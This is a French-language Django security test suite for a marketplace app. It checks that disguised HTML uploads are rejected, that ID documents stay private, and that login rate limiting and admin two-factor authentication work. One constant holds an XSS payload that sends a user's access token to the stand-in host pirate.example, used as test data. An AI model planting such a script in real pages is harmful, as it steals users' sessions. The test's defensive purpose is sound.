"""Tests d'attaque : on essaie de contourner les protections."""

from contextlib import ExitStack
from unittest.mock import patch

import pyotp
from django.conf import settings
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import override_settings

from apps.accounts.models import User
from apps.vendors.models import VerificationRequest

from .models import AuditLog
from .storage import PrivateStorage
from .tests_utils import GuineeMallTestCase, image_file

PAGE_PIEGEE = b"<html><script>fetch('https://pirate.example/?t='+localStorage.access_token)</script></html>"


@override_settings(MEDIA_ROOT="/tmp/claude-1000/guineemall-test-media")
class UploadAttackTests(GuineeMallTestCase):
    def setUp(self):
        super().setUp()
        self.vendor = self.make_vendor()
        self.user = self.make_client()

    def test_page_html_deguisee_en_video_refusee_dans_les_statuts(self):
        self.client.force_authenticate(self.vendor.user)
        fake = SimpleUploadedFile("promo.mp4", PAGE_PIEGEE, content_type="video/mp4")
        r = self.client.post("/api/vendor/statuts/", {"media": fake}, format="multipart")
        self.assertEqual(r.status_code, 400)

    def test_page_html_refusee_dans_le_chat(self):
        self.client.force_authenticate(self.user)
        conv = self.client.post("/api/conversations/start/", {"shop": self.vendor.slug}).data
        for name, ctype in [("facture.html", "text/html"), ("photo.jpg", "image/jpeg"), ("logo.svg", "image/svg+xml")]:
            fake = SimpleUploadedFile(name, PAGE_PIEGEE, content_type=ctype)
            r = self.client.post(f"/api/conversations/{conv['id']}/messages/", {"attachment": fake}, format="multipart")
            self.assertEqual(r.status_code, 400, name)

    def test_fichier_accepte_renomme_au_hasard(self):
        self.client.force_authenticate(self.user)
        conv = self.client.post("/api/conversations/start/", {"shop": self.vendor.slug}).data
        r = self.client.post(f"/api/conversations/{conv['id']}/messages/", {"attachment": image_file("mon-nom.png")}, format="multipart")
        self.assertEqual(r.status_code, 201)
        self.assertNotIn("mon-nom", r.data["attachment"])
        self.assertRegex(r.data["attachment"], r"/chat/[0-9a-f]{32}\.png$")

    def test_pieces_d_identite_privees(self):
        # Le stockage privé est créé au chargement du modèle : on le redirige vers un dossier de test
        private = PrivateStorage(location="/tmp/claude-1000/guineemall-test-private")
        fields = [VerificationRequest._meta.get_field(f) for f in ("document_front", "document_back", "shop_photo")]
        with ExitStack() as stack:
            for field in fields:
                stack.enter_context(patch.object(field, "storage", private))
            self._check_private_documents()

    def _check_private_documents(self):
        self.client.force_authenticate(self.vendor.user)
        self.client.post("/api/vendor/verification/", {
            "document_type": "id_card", "document_number": "GN1", "document_front": image_file("cni.png"),
        }, format="multipart")
        vr = VerificationRequest.objects.get()
        self.assertTrue(vr.document_front.path.startswith("/tmp/claude-1000/guineemall-test-private"))
        self.assertFalse(vr.document_front.path.startswith(str(settings.MEDIA_ROOT)))
        # En réel, le stockage des pièces d'identité n'est pas sous le dossier public
        real = VerificationRequest._meta.get_field("document_front")
        self.assertIsInstance(real.storage, PrivateStorage)
        self.assertEqual(vr.document_front.url, "")

        url = f"/private/verifications/{vr.pk}/document_front/"
        self.client.logout()
        self.assertNotEqual(self.client.get(url).status_code, 200)  # anonyme
        self.client.force_login(self.vendor.user)
        self.assertNotEqual(self.client.get(url).status_code, 200)  # le vendeur lui-même non plus
        admin = User.objects.create_superuser(email="adm@test.gn", password="x", name="Adm")
        self.client.force_login(admin)
        self.assertEqual(self.client.get(url).status_code, 200)
        self.assertTrue(AuditLog.objects.filter(action="verification.document_viewed", actor=admin).exists())


class BruteForceTests(GuineeMallTestCase):
    def test_connexion_bloquee_apres_trop_d_essais_sur_un_compte(self):
        self.make_client("cible@test.gn")
        codes = [
            self.client.post("/api/auth/token/", {"email": "cible@test.gn", "password": f"essai{i}"}).status_code
            for i in range(12)
        ]
        self.assertIn(429, codes)
        self.assertEqual(codes[0], 401)


class TwoFactorTests(GuineeMallTestCase):
    def setUp(self):
        super().setUp()
        self.admin = User.objects.create_superuser(email="chef@test.gn", password="MotDePasse123!", name="Chef")

    def login(self, **extra):
        return self.client.post("/api/auth/token/", {"email": "chef@test.gn", "password": "MotDePasse123!", **extra})

    def test_activation_puis_code_exige_a_la_connexion(self):
        self.client.force_authenticate(self.admin)
        secret = self.client.post("/api/auth/2fa/setup/").data["secret"]
        self.assertEqual(self.client.post("/api/auth/2fa/enable/", {"code": "000000"}).status_code, 400)
        self.assertEqual(self.client.post("/api/auth/2fa/enable/", {"code": pyotp.TOTP(secret).now()}).status_code, 200)
        self.client.force_authenticate(None)

        r = self.login()  # mot de passe seul : refusé
        self.assertEqual((r.status_code, r.json()["code"]), (401, "otp_required"))
        r = self.login(otp="123456")
        self.assertEqual((r.status_code, r.json()["code"]), (401, "otp_invalid"))
        self.assertEqual(self.login(otp=pyotp.TOTP(secret).now()).status_code, 200)
        self.assertTrue(AuditLog.objects.filter(action="auth.2fa_failed").exists())

    def test_admin_sans_double_authentification_bloque(self):
        self.client.force_authenticate(self.admin)
        self.assertEqual(self.client.get("/api/admin/dashboard/").status_code, 403)
        self.assertEqual(self.client.post("/api/admin/session/").status_code, 403)

    def test_ancienne_page_de_connexion_admin_fermee(self):
        r = self.client.post(f"/{settings.ADMIN_URL}login/", {"username": "chef@test.gn", "password": "MotDePasse123!"})
        self.assertEqual(r.status_code, 302)
        self.assertIn("/connexion?suivant=/administration", r["Location"])
        self.assertNotEqual(self.client.get(f"/{settings.ADMIN_URL}").status_code, 200)  # pas de session ouverte
